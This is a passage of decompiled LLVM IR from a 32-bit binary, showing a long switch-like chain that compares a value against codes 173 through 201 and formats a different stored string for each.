  br i1 %v1_804c57c, label %dec_label_pc_804c5ae, label %dec_label_pc_804c57e

dec_label_pc_804c57e:                             ; preds = %dec_label_pc_804c575
  %v0_804c57e = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c57e = zext i8 %v0_804c57e to i32
  store i32 %v1_804c57e, i32* @edx, align 4
  %v0_804c588 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c588 = zext i8 %v0_804c588 to i32
  %v2_804c597 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c597, i32* @ebx, align 4
  %v5_804c5a9 = call i32 @function_8048c55(i32 %v2_804c597, i32 ptrtoint ([13 x i8]* @global_var_805b29b.215 to i32), i32 %v1_804c588, i32 %v1_804c57e)
  br label %dec_label_pc_804c5ae

dec_label_pc_804c5ae:                             ; preds = %dec_label_pc_804c575, %dec_label_pc_804c57e
  %v13_804c5ae = icmp eq i32 %v2_804a0a2, 173
  %v1_804c5b5 = icmp eq i1 %v13_804c5ae, false
  br i1 %v1_804c5b5, label %dec_label_pc_804c5e7, label %dec_label_pc_804c5b7

dec_label_pc_804c5b7:                             ; preds = %dec_label_pc_804c5ae
  %v0_804c5b7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c5b7 = zext i8 %v0_804c5b7 to i32
  store i32 %v1_804c5b7, i32* @edx, align 4
  %v0_804c5c1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c5c1 = zext i8 %v0_804c5c1 to i32
  %v2_804c5d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5d0, i32* @ebx, align 4
  %v5_804c5e2 = call i32 @function_8048c55(i32 %v2_804c5d0, i32 ptrtoint ([14 x i8]* @global_var_805b2a8.216 to i32), i32 %v1_804c5c1, i32 %v1_804c5b7)
  br label %dec_label_pc_804c5e7

dec_label_pc_804c5e7:                             ; preds = %dec_label_pc_804c5ae, %dec_label_pc_804c5b7
  %v13_804c5e7 = icmp eq i32 %v2_804a0a2, 174
  %v1_804c5ee = icmp eq i1 %v13_804c5e7, false
  br i1 %v1_804c5ee, label %dec_label_pc_804c620, label %dec_label_pc_804c5f0

dec_label_pc_804c5f0:                             ; preds = %dec_label_pc_804c5e7
  %v0_804c5f0 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c5f0 = zext i8 %v0_804c5f0 to i32
  store i32 %v1_804c5f0, i32* @edx, align 4
  %v0_804c5fa = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c5fa = zext i8 %v0_804c5fa to i32
  %v2_804c609 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c609, i32* @ebx, align 4
  %v5_804c61b = call i32 @function_8048c55(i32 %v2_804c609, i32 ptrtoint ([13 x i8]* @global_var_805b2b6.217 to i32), i32 %v1_804c5fa, i32 %v1_804c5f0)
  br label %dec_label_pc_804c620

dec_label_pc_804c620:                             ; preds = %dec_label_pc_804c5e7, %dec_label_pc_804c5f0
  %v13_804c620 = icmp eq i32 %v2_804a0a2, 175
  %v1_804c627 = icmp eq i1 %v13_804c620, false
  br i1 %v1_804c627, label %dec_label_pc_804c659, label %dec_label_pc_804c629

dec_label_pc_804c629:                             ; preds = %dec_label_pc_804c620
  %v0_804c629 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c629 = zext i8 %v0_804c629 to i32
  store i32 %v1_804c629, i32* @edx, align 4
  %v0_804c633 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c633 = zext i8 %v0_804c633 to i32
  %v2_804c642 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c642, i32* @ebx, align 4
  %v5_804c654 = call i32 @function_8048c55(i32 %v2_804c642, i32 ptrtoint ([14 x i8]* @global_var_805b2c3.218 to i32), i32 %v1_804c633, i32 %v1_804c629)
  br label %dec_label_pc_804c659

dec_label_pc_804c659:                             ; preds = %dec_label_pc_804c620, %dec_label_pc_804c629
  %v10_804c659 = icmp eq i32 %v2_804a0a2, 176
  %v1_804c660 = icmp eq i1 %v10_804c659, false
  br i1 %v1_804c660, label %dec_label_pc_804c692, label %dec_label_pc_804c662

dec_label_pc_804c662:                             ; preds = %dec_label_pc_804c659
  %v0_804c662 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c662 = zext i8 %v0_804c662 to i32
  store i32 %v1_804c662, i32* @edx, align 4
  %v0_804c66c = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c66c = zext i8 %v0_804c66c to i32
  %v2_804c67b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c67b, i32* @ebx, align 4
  %v5_804c68d = call i32 @function_8048c55(i32 %v2_804c67b, i32 ptrtoint ([14 x i8]* @global_var_805b2d1.219 to i32), i32 %v1_804c66c, i32 %v1_804c662)
  br label %dec_label_pc_804c692

dec_label_pc_804c692:                             ; preds = %dec_label_pc_804c659, %dec_label_pc_804c662
  %v13_804c692 = icmp eq i32 %v2_804a0a2, 177
  %v1_804c699 = icmp eq i1 %v13_804c692, false
  br i1 %v1_804c699, label %dec_label_pc_804c6cb, label %dec_label_pc_804c69b

dec_label_pc_804c69b:                             ; preds = %dec_label_pc_804c692
  %v0_804c69b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c69b = zext i8 %v0_804c69b to i32
  store i32 %v1_804c69b, i32* @edx, align 4
  %v0_804c6a5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c6a5 = zext i8 %v0_804c6a5 to i32
  %v2_804c6b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6b4, i32* @ebx, align 4
  %v5_804c6c6 = call i32 @function_8048c55(i32 %v2_804c6b4, i32 ptrtoint ([14 x i8]* @global_var_805b2df.220 to i32), i32 %v1_804c6a5, i32 %v1_804c69b)
  br label %dec_label_pc_804c6cb

dec_label_pc_804c6cb:                             ; preds = %dec_label_pc_804c692, %dec_label_pc_804c69b
  %v13_804c6cb = icmp eq i32 %v2_804a0a2, 178
  %v1_804c6d2 = icmp eq i1 %v13_804c6cb, false
  br i1 %v1_804c6d2, label %dec_label_pc_804c704, label %dec_label_pc_804c6d4

dec_label_pc_804c6d4:                             ; preds = %dec_label_pc_804c6cb
  %v0_804c6d4 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c6d4 = zext i8 %v0_804c6d4 to i32
  store i32 %v1_804c6d4, i32* @edx, align 4
  %v0_804c6de = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c6de = zext i8 %v0_804c6de to i32
  %v2_804c6ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6ed, i32* @ebx, align 4
  %v5_804c6ff = call i32 @function_8048c55(i32 %v2_804c6ed, i32 ptrtoint ([14 x i8]* @global_var_805b2ed.221 to i32), i32 %v1_804c6de, i32 %v1_804c6d4)
  br label %dec_label_pc_804c704

dec_label_pc_804c704:                             ; preds = %dec_label_pc_804c6cb, %dec_label_pc_804c6d4
  %v13_804c704 = icmp eq i32 %v2_804a0a2, 179
  %v1_804c70b = icmp eq i1 %v13_804c704, false
  br i1 %v1_804c70b, label %dec_label_pc_804c73d, label %dec_label_pc_804c70d

dec_label_pc_804c70d:                             ; preds = %dec_label_pc_804c704
  %v0_804c70d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c70d = zext i8 %v0_804c70d to i32
  store i32 %v1_804c70d, i32* @edx, align 4
  %v0_804c717 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c717 = zext i8 %v0_804c717 to i32
  %v2_804c726 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c726, i32* @ebx, align 4
  %v5_804c738 = call i32 @function_8048c55(i32 %v2_804c726, i32 ptrtoint ([14 x i8]* @global_var_805b256.210 to i32), i32 %v1_804c717, i32 %v1_804c70d)
  br label %dec_label_pc_804c73d

dec_label_pc_804c73d:                             ; preds = %dec_label_pc_804c704, %dec_label_pc_804c70d
  %v13_804c73d = icmp eq i32 %v2_804a0a2, 180
  %v1_804c744 = icmp eq i1 %v13_804c73d, false
  br i1 %v1_804c744, label %dec_label_pc_804c776, label %dec_label_pc_804c746

dec_label_pc_804c746:                             ; preds = %dec_label_pc_804c73d
  %v0_804c746 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c746 = zext i8 %v0_804c746 to i32
  store i32 %v1_804c746, i32* @edx, align 4
  %v0_804c750 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c750 = zext i8 %v0_804c750 to i32
  %v2_804c75f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c75f, i32* @ebx, align 4
  %v5_804c771 = call i32 @function_8048c55(i32 %v2_804c75f, i32 ptrtoint ([13 x i8]* @global_var_805b2fb.222 to i32), i32 %v1_804c750, i32 %v1_804c746)
  br label %dec_label_pc_804c776

dec_label_pc_804c776:                             ; preds = %dec_label_pc_804c73d, %dec_label_pc_804c746
  %v13_804c776 = icmp eq i32 %v2_804a0a2, 181
  %v1_804c77d = icmp eq i1 %v13_804c776, false
  br i1 %v1_804c77d, label %dec_label_pc_804c7af, label %dec_label_pc_804c77f

dec_label_pc_804c77f:                             ; preds = %dec_label_pc_804c776
  %v0_804c77f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c77f = zext i8 %v0_804c77f to i32
  store i32 %v1_804c77f, i32* @edx, align 4
  %v0_804c789 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c789 = zext i8 %v0_804c789 to i32
  %v2_804c798 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c798, i32* @ebx, align 4
  %v5_804c7aa = call i32 @function_8048c55(i32 %v2_804c798, i32 ptrtoint ([12 x i8]* @global_var_805b308.223 to i32), i32 %v1_804c789, i32 %v1_804c77f)
  br label %dec_label_pc_804c7af

dec_label_pc_804c7af:                             ; preds = %dec_label_pc_804c776, %dec_label_pc_804c77f
  %v13_804c7af = icmp eq i32 %v2_804a0a2, 182
  %v1_804c7b6 = icmp eq i1 %v13_804c7af, false
  br i1 %v1_804c7b6, label %dec_label_pc_804c7e8, label %dec_label_pc_804c7b8

dec_label_pc_804c7b8:                             ; preds = %dec_label_pc_804c7af
  %v0_804c7b8 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c7b8 = zext i8 %v0_804c7b8 to i32
  store i32 %v1_804c7b8, i32* @edx, align 4
  %v0_804c7c2 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c7c2 = zext i8 %v0_804c7c2 to i32
  %v2_804c7d1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7d1, i32* @ebx, align 4
  %v5_804c7e3 = call i32 @function_8048c55(i32 %v2_804c7d1, i32 ptrtoint ([14 x i8]* @global_var_805b314.224 to i32), i32 %v1_804c7c2, i32 %v1_804c7b8)
  br label %dec_label_pc_804c7e8

dec_label_pc_804c7e8:                             ; preds = %dec_label_pc_804c7af, %dec_label_pc_804c7b8
  %v13_804c7e8 = icmp eq i32 %v2_804a0a2, 183
  %v1_804c7ef = icmp eq i1 %v13_804c7e8, false
  br i1 %v1_804c7ef, label %dec_label_pc_804c821, label %dec_label_pc_804c7f1

dec_label_pc_804c7f1:                             ; preds = %dec_label_pc_804c7e8
  %v0_804c7f1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c7f1 = zext i8 %v0_804c7f1 to i32
  store i32 %v1_804c7f1, i32* @edx, align 4
  %v0_804c7fb = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c7fb = zext i8 %v0_804c7fb to i32
  %v2_804c80a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c80a, i32* @ebx, align 4
  %v5_804c81c = call i32 @function_8048c55(i32 %v2_804c80a, i32 ptrtoint ([14 x i8]* @global_var_805b322.225 to i32), i32 %v1_804c7fb, i32 %v1_804c7f1)
  br label %dec_label_pc_804c821

dec_label_pc_804c821:                             ; preds = %dec_label_pc_804c7e8, %dec_label_pc_804c7f1
  %v13_804c821 = icmp eq i32 %v2_804a0a2, 184
  %v1_804c828 = icmp eq i1 %v13_804c821, false
  br i1 %v1_804c828, label %dec_label_pc_804c85a, label %dec_label_pc_804c82a

dec_label_pc_804c82a:                             ; preds = %dec_label_pc_804c821
  %v0_804c82a = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c82a = zext i8 %v0_804c82a to i32
  store i32 %v1_804c82a, i32* @edx, align 4
  %v0_804c834 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c834 = zext i8 %v0_804c834 to i32
  %v2_804c843 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c843, i32* @ebx, align 4
  %v5_804c855 = call i32 @function_8048c55(i32 %v2_804c843, i32 ptrtoint ([14 x i8]* @global_var_805b330.226 to i32), i32 %v1_804c834, i32 %v1_804c82a)
  br label %dec_label_pc_804c85a

dec_label_pc_804c85a:                             ; preds = %dec_label_pc_804c821, %dec_label_pc_804c82a
  %v13_804c85a = icmp eq i32 %v2_804a0a2, 185
  %v1_804c861 = icmp eq i1 %v13_804c85a, false
  br i1 %v1_804c861, label %dec_label_pc_804c893, label %dec_label_pc_804c863

dec_label_pc_804c863:                             ; preds = %dec_label_pc_804c85a
  %v0_804c863 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c863 = zext i8 %v0_804c863 to i32
  store i32 %v1_804c863, i32* @edx, align 4
  %v0_804c86d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c86d = zext i8 %v0_804c86d to i32
  %v2_804c87c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c87c, i32* @ebx, align 4
  %v5_804c88e = call i32 @function_8048c55(i32 %v2_804c87c, i32 ptrtoint ([14 x i8]* @global_var_805b33e.227 to i32), i32 %v1_804c86d, i32 %v1_804c863)
  br label %dec_label_pc_804c893

dec_label_pc_804c893:                             ; preds = %dec_label_pc_804c85a, %dec_label_pc_804c863
  %v13_804c893 = icmp eq i32 %v2_804a0a2, 186
  %v1_804c89a = icmp eq i1 %v13_804c893, false
  br i1 %v1_804c89a, label %dec_label_pc_804c8cc, label %dec_label_pc_804c89c

dec_label_pc_804c89c:                             ; preds = %dec_label_pc_804c893
  %v0_804c89c = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c89c = zext i8 %v0_804c89c to i32
  store i32 %v1_804c89c, i32* @edx, align 4
  %v0_804c8a6 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c8a6 = zext i8 %v0_804c8a6 to i32
  %v2_804c8b5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8b5, i32* @ebx, align 4
  %v5_804c8c7 = call i32 @function_8048c55(i32 %v2_804c8b5, i32 ptrtoint ([14 x i8]* @global_var_805b34c.228 to i32), i32 %v1_804c8a6, i32 %v1_804c89c)
  br label %dec_label_pc_804c8cc

dec_label_pc_804c8cc:                             ; preds = %dec_label_pc_804c893, %dec_label_pc_804c89c
  %v13_804c8cc = icmp eq i32 %v2_804a0a2, 187
  %v1_804c8d3 = icmp eq i1 %v13_804c8cc, false
  br i1 %v1_804c8d3, label %dec_label_pc_804c905, label %dec_label_pc_804c8d5

dec_label_pc_804c8d5:                             ; preds = %dec_label_pc_804c8cc
  %v0_804c8d5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c8d5 = zext i8 %v0_804c8d5 to i32
  store i32 %v1_804c8d5, i32* @edx, align 4
  %v0_804c8df = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c8df = zext i8 %v0_804c8df to i32
  %v2_804c8ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8ee, i32* @ebx, align 4
  %v5_804c900 = call i32 @function_8048c55(i32 %v2_804c8ee, i32 ptrtoint ([14 x i8]* @global_var_805b35a.229 to i32), i32 %v1_804c8df, i32 %v1_804c8d5)
  br label %dec_label_pc_804c905

dec_label_pc_804c905:                             ; preds = %dec_label_pc_804c8cc, %dec_label_pc_804c8d5
  %v13_804c905 = icmp eq i32 %v2_804a0a2, 188
  %v1_804c90c = icmp eq i1 %v13_804c905, false
  br i1 %v1_804c90c, label %dec_label_pc_804c93e, label %dec_label_pc_804c90e

dec_label_pc_804c90e:                             ; preds = %dec_label_pc_804c905
  %v0_804c90e = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c90e = zext i8 %v0_804c90e to i32
  store i32 %v1_804c90e, i32* @edx, align 4
  %v0_804c918 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c918 = zext i8 %v0_804c918 to i32
  %v2_804c927 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c927, i32* @ebx, align 4
  %v5_804c939 = call i32 @function_8048c55(i32 %v2_804c927, i32 ptrtoint ([14 x i8]* @global_var_805b368.230 to i32), i32 %v1_804c918, i32 %v1_804c90e)
  br label %dec_label_pc_804c93e

dec_label_pc_804c93e:                             ; preds = %dec_label_pc_804c905, %dec_label_pc_804c90e
  %v13_804c93e = icmp eq i32 %v2_804a0a2, 189
  %v1_804c945 = icmp eq i1 %v13_804c93e, false
  br i1 %v1_804c945, label %dec_label_pc_804c977, label %dec_label_pc_804c947

dec_label_pc_804c947:                             ; preds = %dec_label_pc_804c93e
  %v0_804c947 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c947 = zext i8 %v0_804c947 to i32
  store i32 %v1_804c947, i32* @edx, align 4
  %v0_804c951 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c951 = zext i8 %v0_804c951 to i32
  %v2_804c960 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c960, i32* @ebx, align 4
  %v5_804c972 = call i32 @function_8048c55(i32 %v2_804c960, i32 ptrtoint ([14 x i8]* @global_var_805b376.231 to i32), i32 %v1_804c951, i32 %v1_804c947)
  br label %dec_label_pc_804c977

dec_label_pc_804c977:                             ; preds = %dec_label_pc_804c93e, %dec_label_pc_804c947
  %v13_804c977 = icmp eq i32 %v2_804a0a2, 190
  %v1_804c97e = icmp eq i1 %v13_804c977, false
  br i1 %v1_804c97e, label %dec_label_pc_804c9b0, label %dec_label_pc_804c980

dec_label_pc_804c980:                             ; preds = %dec_label_pc_804c977
  %v0_804c980 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c980 = zext i8 %v0_804c980 to i32
  store i32 %v1_804c980, i32* @edx, align 4
  %v0_804c98a = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c98a = zext i8 %v0_804c98a to i32
  %v2_804c999 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c999, i32* @ebx, align 4
  %v5_804c9ab = call i32 @function_8048c55(i32 %v2_804c999, i32 ptrtoint ([14 x i8]* @global_var_805b384.232 to i32), i32 %v1_804c98a, i32 %v1_804c980)
  br label %dec_label_pc_804c9b0

dec_label_pc_804c9b0:                             ; preds = %dec_label_pc_804c977, %dec_label_pc_804c980
  %v13_804c9b0 = icmp eq i32 %v2_804a0a2, 191
  %v1_804c9b7 = icmp eq i1 %v13_804c9b0, false
  br i1 %v1_804c9b7, label %dec_label_pc_804c9e9, label %dec_label_pc_804c9b9

dec_label_pc_804c9b9:                             ; preds = %dec_label_pc_804c9b0
  %v0_804c9b9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c9b9 = zext i8 %v0_804c9b9 to i32
  store i32 %v1_804c9b9, i32* @edx, align 4
  %v0_804c9c3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c9c3 = zext i8 %v0_804c9c3 to i32
  %v2_804c9d2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c9d2, i32* @ebx, align 4
  %v5_804c9e4 = call i32 @function_8048c55(i32 %v2_804c9d2, i32 ptrtoint ([14 x i8]* @global_var_805b392.233 to i32), i32 %v1_804c9c3, i32 %v1_804c9b9)
  br label %dec_label_pc_804c9e9

dec_label_pc_804c9e9:                             ; preds = %dec_label_pc_804c9b0, %dec_label_pc_804c9b9
  %v10_804c9e9 = icmp eq i32 %v2_804a0a2, 192
  %v1_804c9f0 = icmp eq i1 %v10_804c9e9, false
  br i1 %v1_804c9f0, label %dec_label_pc_804ca22, label %dec_label_pc_804c9f2

dec_label_pc_804c9f2:                             ; preds = %dec_label_pc_804c9e9
  %v0_804c9f2 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c9f2 = zext i8 %v0_804c9f2 to i32
  store i32 %v1_804c9f2, i32* @edx, align 4
  %v0_804c9fc = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c9fc = zext i8 %v0_804c9fc to i32
  %v2_804ca0b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ca0b, i32* @ebx, align 4
  %v5_804ca1d = call i32 @function_8048c55(i32 %v2_804ca0b, i32 ptrtoint ([14 x i8]* @global_var_805b3a0.234 to i32), i32 %v1_804c9fc, i32 %v1_804c9f2)
  br label %dec_label_pc_804ca22

dec_label_pc_804ca22:                             ; preds = %dec_label_pc_804c9e9, %dec_label_pc_804c9f2
  %v13_804ca22 = icmp eq i32 %v2_804a0a2, 193
  %v1_804ca29 = icmp eq i1 %v13_804ca22, false
  br i1 %v1_804ca29, label %dec_label_pc_804ca5b, label %dec_label_pc_804ca2b

dec_label_pc_804ca2b:                             ; preds = %dec_label_pc_804ca22
  %v0_804ca2b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ca2b = zext i8 %v0_804ca2b to i32
  store i32 %v1_804ca2b, i32* @edx, align 4
  %v0_804ca35 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ca35 = zext i8 %v0_804ca35 to i32
  %v2_804ca44 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ca44, i32* @ebx, align 4
  %v5_804ca56 = call i32 @function_8048c55(i32 %v2_804ca44, i32 ptrtoint ([13 x i8]* @global_var_805b3ae.235 to i32), i32 %v1_804ca35, i32 %v1_804ca2b)
  br label %dec_label_pc_804ca5b

dec_label_pc_804ca5b:                             ; preds = %dec_label_pc_804ca22, %dec_label_pc_804ca2b
  %v13_804ca5b = icmp eq i32 %v2_804a0a2, 194
  %v1_804ca62 = icmp eq i1 %v13_804ca5b, false
  br i1 %v1_804ca62, label %dec_label_pc_804ca94, label %dec_label_pc_804ca64

dec_label_pc_804ca64:                             ; preds = %dec_label_pc_804ca5b
  %v0_804ca64 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ca64 = zext i8 %v0_804ca64 to i32
  store i32 %v1_804ca64, i32* @edx, align 4
  %v0_804ca6e = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ca6e = zext i8 %v0_804ca6e to i32
  %v2_804ca7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ca7d, i32* @ebx, align 4
  %v5_804ca8f = call i32 @function_8048c55(i32 %v2_804ca7d, i32 ptrtoint ([13 x i8]* @global_var_805b3bb.236 to i32), i32 %v1_804ca6e, i32 %v1_804ca64)
  br label %dec_label_pc_804ca94

dec_label_pc_804ca94:                             ; preds = %dec_label_pc_804ca5b, %dec_label_pc_804ca64
  %v13_804ca94 = icmp eq i32 %v2_804a0a2, 195
  %v1_804ca9b = icmp eq i1 %v13_804ca94, false
  br i1 %v1_804ca9b, label %dec_label_pc_804cacd, label %dec_label_pc_804ca9d

dec_label_pc_804ca9d:                             ; preds = %dec_label_pc_804ca94
  %v0_804ca9d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ca9d = zext i8 %v0_804ca9d to i32
  store i32 %v1_804ca9d, i32* @edx, align 4
  %v0_804caa7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804caa7 = zext i8 %v0_804caa7 to i32
  %v2_804cab6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cab6, i32* @ebx, align 4
  %v5_804cac8 = call i32 @function_8048c55(i32 %v2_804cab6, i32 ptrtoint ([13 x i8]* @global_var_805b3c8.237 to i32), i32 %v1_804caa7, i32 %v1_804ca9d)
  br label %dec_label_pc_804cacd

dec_label_pc_804cacd:                             ; preds = %dec_label_pc_804ca94, %dec_label_pc_804ca9d
  %v13_804cacd = icmp eq i32 %v2_804a0a2, 196
  %v1_804cad4 = icmp eq i1 %v13_804cacd, false
  br i1 %v1_804cad4, label %dec_label_pc_804cb06, label %dec_label_pc_804cad6

dec_label_pc_804cad6:                             ; preds = %dec_label_pc_804cacd
  %v0_804cad6 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804cad6 = zext i8 %v0_804cad6 to i32
  store i32 %v1_804cad6, i32* @edx, align 4
  %v0_804cae0 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804cae0 = zext i8 %v0_804cae0 to i32
  %v2_804caef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804caef, i32* @ebx, align 4
  %v5_804cb01 = call i32 @function_8048c55(i32 %v2_804caef, i32 ptrtoint ([13 x i8]* @global_var_805b3d5.238 to i32), i32 %v1_804cae0, i32 %v1_804cad6)
  br label %dec_label_pc_804cb06

dec_label_pc_804cb06:                             ; preds = %dec_label_pc_804cacd, %dec_label_pc_804cad6
  %v13_804cb06 = icmp eq i32 %v2_804a0a2, 197
  %v1_804cb0d = icmp eq i1 %v13_804cb06, false
  br i1 %v1_804cb0d, label %dec_label_pc_804cb3f, label %dec_label_pc_804cb0f

dec_label_pc_804cb0f:                             ; preds = %dec_label_pc_804cb06
  %v0_804cb0f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804cb0f = zext i8 %v0_804cb0f to i32
  store i32 %v1_804cb0f, i32* @edx, align 4
  %v0_804cb19 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804cb19 = zext i8 %v0_804cb19 to i32
  %v2_804cb28 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cb28, i32* @ebx, align 4
  %v5_804cb3a = call i32 @function_8048c55(i32 %v2_804cb28, i32 ptrtoint ([13 x i8]* @global_var_805b3e2.239 to i32), i32 %v1_804cb19, i32 %v1_804cb0f)
  br label %dec_label_pc_804cb3f

dec_label_pc_804cb3f:                             ; preds = %dec_label_pc_804cb06, %dec_label_pc_804cb0f
  %v13_804cb3f = icmp eq i32 %v2_804a0a2, 198
  %v1_804cb46 = icmp eq i1 %v13_804cb3f, false
  br i1 %v1_804cb46, label %dec_label_pc_804cb78, label %dec_label_pc_804cb48

dec_label_pc_804cb48:                             ; preds = %dec_label_pc_804cb3f
  %v0_804cb48 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804cb48 = zext i8 %v0_804cb48 to i32
  store i32 %v1_804cb48, i32* @edx, align 4
  %v0_804cb52 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804cb52 = zext i8 %v0_804cb52 to i32
  %v2_804cb61 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cb61, i32* @ebx, align 4
  %v5_804cb73 = call i32 @function_8048c55(i32 %v2_804cb61, i32 ptrtoint ([13 x i8]* @global_var_805b3ef.240 to i32), i32 %v1_804cb52, i32 %v1_804cb48)
  br label %dec_label_pc_804cb78

dec_label_pc_804cb78:                             ; preds = %dec_label_pc_804cb3f, %dec_label_pc_804cb48
  %v13_804cb78 = icmp eq i32 %v2_804a0a2, 199
  %v1_804cb7f = icmp eq i1 %v13_804cb78, false
  br i1 %v1_804cb7f, label %dec_label_pc_804cbb1, label %dec_label_pc_804cb81

dec_label_pc_804cb81:                             ; preds = %dec_label_pc_804cb78
  %v0_804cb81 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804cb81 = zext i8 %v0_804cb81 to i32
  store i32 %v1_804cb81, i32* @edx, align 4
  %v0_804cb8b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804cb8b = zext i8 %v0_804cb8b to i32
  %v2_804cb9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cb9a, i32* @ebx, align 4
  %v5_804cbac = call i32 @function_8048c55(i32 %v2_804cb9a, i32 ptrtoint ([14 x i8]* @global_var_805b3fc.241 to i32), i32 %v1_804cb8b, i32 %v1_804cb81)
  br label %dec_label_pc_804cbb1

dec_label_pc_804cbb1:                             ; preds = %dec_label_pc_804cb78, %dec_label_pc_804cb81
  %v13_804cbb1 = icmp eq i32 %v2_804a0a2, 200
  %v1_804cbb8 = icmp eq i1 %v13_804cbb1, false
  br i1 %v1_804cbb8, label %dec_label_pc_804cbea, label %dec_label_pc_804cbba

dec_label_pc_804cbba:                             ; preds = %dec_label_pc_804cbb1
  %v0_804cbba = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804cbba = zext i8 %v0_804cbba to i32
  store i32 %v1_804cbba, i32* @edx, align 4
  %v0_804cbc4 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804cbc4 = zext i8 %v0_804cbc4 to i32
  %v2_804cbd3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cbd3, i32* @ebx, align 4
  %v5_804cbe5 = call i32 @function_8048c55(i32 %v2_804cbd3, i32 ptrtoint ([14 x i8]* @global_var_805b40a.242 to i32), i32 %v1_804cbc4, i32 %v1_804cbba)
  br label %dec_label_pc_804cbea

dec_label_pc_804cbea:                             ; preds = %dec_label_pc_804cbb1, %dec_label_pc_804cbba
  %v13_804cbea = icmp eq i32 %v2_804a0a2, 201
  %v1_804cbf1 = icmp eq i1 %v13_804cbea, false
  br i1 %v1_804cbf1, label %dec_label_pc_804cc23, label %dec_label_pc_804cbf3

dec_label_pc_804cbf3:                             ; preds = %dec_label_pc_804cbea
  %v0_804cbf3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804cbf3 = zext i8 %v0_804cbf3 to i32
  store i32 %v1_804cbf3, i32* @edx, align 4
  %v0_804cbfd = load i8, i8* @global_var_805e8d9.41, align 1
